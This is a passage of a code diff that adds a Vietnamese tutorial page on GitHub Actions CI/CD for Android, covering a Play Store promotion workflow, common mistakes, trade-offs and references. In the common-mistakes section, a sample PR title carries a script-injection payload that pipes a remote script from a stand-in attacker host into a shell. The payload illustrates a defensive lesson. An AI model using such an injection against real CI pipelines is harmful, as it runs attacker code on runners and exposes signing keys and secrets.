+    A["(1) workflow_dispatch trên tag v1.4.0&lt;br/&gt;user_fraction = 0.1"] --&gt; B["(2) chờ duyệt production"]
+    B --&gt; C["(3) promoteReleaseArtifact&lt;br/&gt;internal sang production, inProgress"]
+    C --&gt; D["Production 10%"]
+</div>
+
+<p><strong>Code:</strong></p>
+
+<pre data-lang="yaml"><code># .github/workflows/promote.yml
+name: Promote to production
+
+on:
+  workflow_dispatch:                              # (1)
+    inputs:
+      user_fraction:
+        description: 'Tỉ lệ người dùng nhận bản mới, nhỏ hơn 1'
+        required: true
+        default: '0.1'
+
+permissions:
+  contents: read
+
+concurrency:
+  group: release                                  # (2)
+  cancel-in-progress: false
+
+jobs:
+  promote:
+    runs-on: ubuntu-latest
+    environment: production                       # (2)
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-java@v6
+        with:
+          distribution: temurin
+          java-version: '17'
+      - uses: gradle/actions/setup-gradle@v6
+      - name: Promote internal to production
+        env:
+          ANDROID_PUBLISHER_CREDENTIALS: \${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}
+          USER_FRACTION: \${{ inputs.user_fraction }}
+        run: |                                    # (3) promote đúng AAB đã có, không build lại
+          ./gradlew promoteReleaseArtifact \\
+            --from-track internal --promote-track production \\
+            --release-status inProgress --user-fraction "$USER_FRACTION"</code></pre>
+
+<p><strong>Kết quả:</strong> <strong>Play Console → Production</strong> có release mới staged rollout 10%, cùng <code>versionCode</code> với bản trên internal, chờ review của Google. Vitals và Crashlytics ổn thì tăng tỉ lệ như bài toán 2; tới 100% dùng <code>--release-status completed</code> (GPP từ chối <code>--user-fraction 1.0</code>).</p>
+
+<div class="callout callout-warn"><span class="callout-icon">⚠️</span><div class="callout-body">Mặc định promote <strong>thay</strong> release đang có trên track đích và halt staged rollout đang chạy ở đó. Muốn giữ rollout cũ song song thì thêm <code>--retain-existing-rollout</code>.</div></div>
+
+<h2>Khi nào nên và không nên dùng</h2>
+
+<p><strong>Nên dùng</strong> khi code đã ở GitHub (trigger, check, ruleset, secret, environment cùng một chỗ, không vận hành máy build), build chạy được trên runner Linux chuẩn, team muốn pipeline là file trong repo.</p>
+
+<p><strong>Cân nhắc công cụ khác</strong> khi code không được rời mạng nội bộ hoặc đã có Jenkins (<a href="jenkins.md" target="_blank" rel="noopener">11.1 Jenkins</a>); khi team mobile cần macOS cho iOS và step dựng sẵn (<a href="bitrise.md" target="_blank" rel="noopener">11.2 Bitrise</a>); dự án còn <code>.travis.yml</code> thì xem cách chuyển ở <a href="travis_ci.md" target="_blank" rel="noopener">11.3 Travis CI</a>.</p>
+
+<p><strong>Không nên</strong> đưa lên CI việc chưa chạy ổn bằng tay (UI test flaky, script phát hành chưa từng thành công): CI đỏ ngẫu nhiên làm team quen bỏ qua dấu đỏ.</p>
+
+<h2>Sai lầm thường gặp</h2>
+
+<h3>1. Chèn secret hoặc dữ liệu từ PR thẳng vào lệnh shell</h3>
+
+<pre data-lang="yaml"><code>- run: echo \${{ secrets.RELEASE_KEYSTORE_BASE64 }} | base64 --decode &gt; app/release.jks
+- run: echo "Building \${{ github.event.pull_request.title }}"</code></pre>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> expression được thay vào <strong>trước</strong> khi shell chạy. Dòng 1 đặt secret thẳng vào script; dòng 2 cho phép <strong>script injection</strong>: PR có tiêu đề <code>"; curl attacker.sh | sh; "</code> chạy lệnh tuỳ ý trên runner.</p>
+
+<p><strong>Cách sửa:</strong> đưa giá trị vào <code>env:</code>, dùng <code>"$TEN_BIEN"</code> trong script.</p>
+
+<h3>2. Dùng pull_request_target để PR từ fork có secret</h3>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> <code>pull_request_target</code> chạy trong ngữ cảnh nhánh đích, <strong>có secret</strong>; workflow checkout code của PR rồi chạy <code>./gradlew</code> thì người lạ chỉ cần sửa <code>build.gradle.kts</code> là đọc được khoá ký. <code>actions/checkout</code> v7 chặn mặc định trường hợp này.</p>
+
+<p><strong>Cách sửa:</strong> PR check dùng <code>pull_request</code>, không cần secret; việc cần secret chạy sau merge hoặc trên tag.</p>
+
+<h3>3. versionCode không tăng hoặc trùng</h3>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> step upload đỏ vì Play báo <code>versionCode</code> đã dùng, do tăng tay hoặc re-run lần phát hành đã upload xong.</p>
+
+<p><strong>Cách sửa:</strong> <code>versionCode</code> từ số build kèm offset (mục "versionCode trên CI"); đã upload thì push tag mới thay vì re-run.</p>
+
+<h3>4. Bật required check nhưng job bị bỏ qua vì path filter</h3>
+
+<pre data-lang="yaml"><code>on:
+  pull_request:
+    paths: ['app/**']</code></pre>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> PR chỉ sửa <code>README.md</code> không kích hoạt workflow, check bắt buộc không được báo, PR kẹt ở trạng thái chờ.</p>
+
+<p><strong>Cách sửa:</strong> không lọc theo path ở workflow chứa required check; một job nhỏ xác định file thay đổi, job nặng dùng <code>if:</code> theo kết quả đó (job skipped được tính là đạt).</p>
+
+<h2>Trade-offs</h2>
+
+<ul>
+  <li><strong>Chi phí phút chạy:</strong> repo public dùng runner chuẩn miễn phí; repo private có số phút miễn phí theo gói, vượt thì tính tiền, runner macOS và runner lớn đắt hơn (xem trang billing). Cache Gradle, <code>cancel-in-progress</code>, job emulator có điều kiện tiết kiệm nhiều nhất.</li>
+  <li><strong>Self-hosted runner</strong> (<code>runs-on: [self-hosted, linux]</code>): máy mạnh hơn, cache sẵn trên đĩa, vào được mạng nội bộ; đổi lại phải tự vá hệ điều hành, dọn workspace, và <strong>không</strong> dùng cho repo public vì PR từ fork chạy code trên máy đó.</li>
+  <li><strong>Phụ thuộc nền tảng:</strong> giữ logic trong task Gradle (lint, test, ký, GPP), YAML chỉ là lớp gọi mỏng; chuyển tool chỉ viết lại lớp đó. Action bên thứ ba còn có thể đổi điều khoản (cache <code>gradle/actions</code> v6).</li>
+</ul>
+
+<h2>Lịch sử phát triển</h2>
+
+<ul>
+  <li><strong>2018 – 2019:</strong> GitHub công bố Actions (10/2018, cú pháp HCL), chuyển sang YAML kèm CI/CD (08/2019), GA 13/11/2019.</li>
+  <li><strong>2020:</strong> Gradle phát hành action kiểm tra wrapper; cuối năm GitHub thêm environments với required reviewers.</li>
+  <li><strong>2023:</strong> ruleset ra đời bên cạnh branch protection; <code>upload-artifact</code> v4 đổi backend artifact.</li>
+  <li><strong>2024:</strong> <code>gradle/actions</code> gom <code>setup-gradle</code> và wrapper validation; từ v4 <code>setup-gradle</code> kiểm tra wrapper mặc định.</li>
+  <li><strong>2026:</strong> <code>gradle/actions</code> v6 (03) tách cache thành thành phần độc quyền; <code>actions/checkout</code> v7 (06) chặn checkout code fork trong <code>pull_request_target</code>, <code>workflow_run</code>.</li>
+  <li><strong>Phía Google Play:</strong> Play App Signing ra mắt 2017, AAB 2018; từ 08/2021 app mới bắt buộc AAB; từ 11/2023 tài khoản cá nhân mới phải qua closed test; Gradle Play Publisher 4.0 (01/2026) chuyển sang AGP 9.</li>
+</ul>
+
+<h2>Kết nối hệ thống</h2>
+
+<ul>
+  <li><strong>Tiên quyết:</strong>
+<ul>
+  <li><a href="index.md" target="_blank" rel="noopener">11.0 Tổng quan Session 11</a>: CI, Continuous Delivery/Deployment, stage của pipeline Android.</li>
+  <li><a href="../session_04/android_manifest/package_build_gradle/build_types.md" target="_blank" rel="noopener">Build Types</a>: variant, R8, <code>mapping.txt</code>.</li>
+  <li><a href="../session_01/output_packages/aab_files.md" target="_blank" rel="noopener">Android App Bundle (AAB)</a>: upload key, app signing key, Play App Signing.</li>
+  <li><a href="../coding_analyst_and_testing/lint.md" target="_blank" rel="noopener">10.3 Lint</a>, <a href="../coding_analyst_and_testing/unit_testing.md" target="_blank" rel="noopener">10.2 Unit Testing</a>: task PR check chạy.</li>
+</ul></li>
+  <li><strong>Liên quan:</strong>
+<ul>
+  <li><a href="../session_04/android_manifest/package_build_gradle/flavor.md" target="_blank" rel="noopener">Flavor</a>: matrix theo flavor; <a href="../session_01/output_packages/apk_files.md" target="_blank" rel="noopener">Gói ứng dụng APK</a>: keystore; <a href="../session_04/android_manifest/package_build_gradle/plugin.md" target="_blank" rel="noopener">Plugin</a>: task do AGP sinh ra.</li>
+  <li><a href="../coding_analyst_and_testing/fit_bug_optimization.md" target="_blank" rel="noopener">10.4 Fit / Bug Optimization</a>: Android vitals, Crashlytics, căn cứ tăng rollout.</li>
+  <li><a href="../coding_analyst_and_testing/index.md" target="_blank" rel="noopener">10.0 Tổng quan Session 10</a>: CI là cổng chất lượng trước merge.</li>
+</ul></li>
+  <li><strong>Học tiếp:</strong> <a href="jenkins.md" target="_blank" rel="noopener">11.1 Jenkins</a>, <a href="bitrise.md" target="_blank" rel="noopener">11.2 Bitrise</a>, <a href="travis_ci.md" target="_blank" rel="noopener">11.3 Travis CI</a>: hai pipeline chuẩn trên tool khác.</li>
+</ul>
+
+<h2>Tham khảo</h2>
+
+<ul>
+  <li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax" target="_blank" rel="noopener">Workflow syntax for GitHub Actions</a></li>
+  <li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/variables" target="_blank" rel="noopener">Variables reference</a></li>
+  <li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments" target="_blank" rel="noopener">Deployments and environments</a></li>
+  <li><a href="https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets" target="_blank" rel="noopener">Using secrets in GitHub Actions</a></li>
+  <li><a href="https://docs.github.com/en/actions/reference/security/secure-use" target="_blank" rel="noopener">Security hardening for GitHub Actions</a></li>
+  <li><a href="https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets" target="_blank" rel="noopener">About rulesets</a></li>
+  <li><a href="https://github.com/actions/checkout" target="_blank" rel="noopener">actions/checkout</a>, <a href="https://github.com/actions/setup-java" target="_blank" rel="noopener">actions/setup-java</a>, <a href="https://github.com/actions/upload-artifact" target="_blank" rel="noopener">actions/upload-artifact</a></li>
+  <li><a href="https://github.com/gradle/actions/blob/main/docs/setup-gradle.md" target="_blank" rel="noopener">gradle/actions - setup-gradle docs</a> và <a href="https://blog.gradle.org/github-actions-for-gradle-v6" target="_blank" rel="noopener">GitHub Actions for Gradle v6</a></li>
+  <li><a href="https://github.com/ReactiveCircus/android-emulator-runner" target="_blank" rel="noopener">ReactiveCircus/android-emulator-runner</a></li>
+  <li><a href="https://developers.google.com/android-publisher/getting_started" target="_blank" rel="noopener">Google Play Developer API - Getting started</a></li>
+  <li><a href="https://support.google.com/googleplay/android-developer/answer/9845334" target="_blank" rel="noopener">Set up an open, closed, or internal test</a></li>
+  <li><a href="https://support.google.com/googleplay/android-developer/answer/14151465" target="_blank" rel="noopener">App testing requirements for new personal developer accounts</a></li>
+  <li><a href="https://support.google.com/googleplay/android-developer/answer/6346149" target="_blank" rel="noopener">Release app updates with staged rollouts</a></li>
+  <li><a href="https://developer.android.com/studio/publish/versioning" target="_blank" rel="noopener">Version your app</a></li>
+  <li><a href="https://github.com/Triple-T/gradle-play-publisher" target="_blank" rel="noopener">Gradle Play Publisher</a></li>
+  <li><a href="https://docs.fastlane.tools/actions/supply/" target="_blank" rel="noopener">fastlane supply</a></li>
+  <li><a href="https://docs.cloud.google.com/iam/docs/workload-identity-federation-with-deployment-pipelines" target="_blank" rel="noopener">Workload Identity Federation with deployment pipelines</a> và <a href="https://github.com/google-github-actions/auth" target="_blank" rel="noopener">google-github-actions/auth</a></li>
+</ul>
+    `
+  },
+
   'unit-testing': {
     title: 'Unit Testing',
     summary: 'Unit test là test tự động kiểm tra một đơn vị code (hàm, class) trong cô lập, thay dependency chậm hoặc không kiểm soát được bằng test double, nên chạy nhanh trên JVM và cho cùng kết quả mỗi lần chạy. Bài đi từ đáy lên đỉnh kim tự tháp test: JUnit 4, fake/mock, coroutine và StateFlow, MockWebServer, DAO Room, Robolectric, Espresso, Compose UI test.',
@@ -47314,7 +49881,7 @@ val config = runBlocking { withContext(Dispatchers.IO) { configRepository.load()
       'Triển khai được Compose UI test bằng finder, action, assertion, mainClock và Espresso test cơ bản cho View.'
     ],
     knowledgeGap: 'Nhiều developer có test nhưng test không bắt được bug: mock thẳng interface Retrofit nên không chạm tới parse JSON hay mã lỗi HTTP, chờ bằng Thread.sleep với Dispatchers thật nên test lúc xanh lúc đỏ, quên collector khiến StateFlow của stateIn không đổi giá trị, hoặc dồn mọi thứ lên UI test trên emulator nên không ai chạy trước khi merge.',
-    updatedAt: '2026-11-09',
+    updatedAt: '2026-11-10',
     readTime: '26 phút',
     content: `
 <h2>Vấn đề cần giải quyết</h2>
@@ -48222,7 +50789,7 @@ class ProductApiTest {
   <li><strong>Tiên quyết:</strong> <a href="../session_06/viewmodel.md" target="_blank" rel="noopener">ViewModel</a>, <a href="../session_08/async_threads/coroutines.md" target="_blank" rel="noopener">Coroutines</a>, <a href="../session_07/design_pattern/observer/flow.md" target="_blank" rel="noopener">Flow</a>, <a href="../session_07/design_pattern/di/overview.md" target="_blank" rel="noopener">Dependency Injection Overview</a>.</li>
   <li><strong>Liên quan:</strong> <a href="../session_05/networking.md" target="_blank" rel="noopener">5.3 Networking</a>, <a href="../session_08/networks/retrofit.md" target="_blank" rel="noopener">8.1.1 Retrofit</a>, <a href="../session_08/networks/okhttp.md" target="_blank" rel="noopener">8.1.3 OkHttp</a>; <a href="../session_05/data_store/room_architecture.md" target="_blank" rel="noopener">Room Architecture</a>, <a href="../session_05/data_store/room_transactions.md" target="_blank" rel="noopener">Async Transactions &amp; Flow</a> (test DAO, Flow của Room); <a href="../session_07/architecture/mvvm.md" target="_blank" rel="noopener">MVVM</a>, <a href="../session_07/design_pattern/di/hilt.md" target="_blank" rel="noopener">Hilt</a> (thay binding trong instrumented test); <a href="../jetpack_compose_ui/side_effects/launched_effect.md" target="_blank" rel="noopener">LaunchedEffect</a>, <a href="../jetpack_compose_ui/state/remember_saveable.md" target="_blank" rel="noopener">Remember and rememberSaveable</a>.</li>
   <li><strong>Trong Session 10:</strong> <a href="index.md" target="_blank" rel="noopener">Tổng quan</a>; <a href="debugging.md" target="_blank" rel="noopener">10.1 Debugging</a> tìm ra bug, bài này khoá nó bằng test chống lặp; <a href="lint.md" target="_blank" rel="noopener">10.3 Lint</a> bắt lỗi không cần chạy code; <a href="fit_bug_optimization.md" target="_blank" rel="noopener">10.4 Fit / Bug Optimization</a> đưa bug từ production về và đo hiệu năng.</li>
-  <li><strong>Học tiếp:</strong> 11.4 Github CI (chưa có bài): chạy <code>testDebugUnitTest</code> và instrumented test tự động trước mỗi lần merge.</li>
+  <li><strong>Học tiếp:</strong> <a href="../cicd_and_publish_store/github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a>: chạy <code>testDebugUnitTest</code> và instrumented test tự động trước mỗi lần merge.</li>
 </ul>
 
 <h2>Tham khảo</h2>
@@ -65155,6 +67722,11 @@ ANDROID_CONTENT['android.coding_analyst.overview'] = ANDROID_CONTENT['session-10
 ANDROID_CONTENT['android.testing.debugging'] = ANDROID_CONTENT['android-debugging'];
 ANDROID_CONTENT['android.testing.lint'] = ANDROID_CONTENT['android-lint'];
 ANDROID_CONTENT['android.testing.fit_bug_optimization'] = ANDROID_CONTENT['fit-bug-optimization'];
+ANDROID_CONTENT['android.cicd.overview'] = ANDROID_CONTENT['session-11-overview'];
+ANDROID_CONTENT['android.cicd.jenkins'] = ANDROID_CONTENT['jenkins'];
+ANDROID_CONTENT['android.cicd.bitrise'] = ANDROID_CONTENT['bitrise'];
+ANDROID_CONTENT['android.cicd.travis_ci'] = ANDROID_CONTENT['travis-ci'];
+ANDROID_CONTENT['android.cicd.github_ci'] = ANDROID_CONTENT['github-ci'];
 
 // ── Session 06: Architecture Components ──────────────────────────
 Object.assign(ANDROID_CONTENT, {
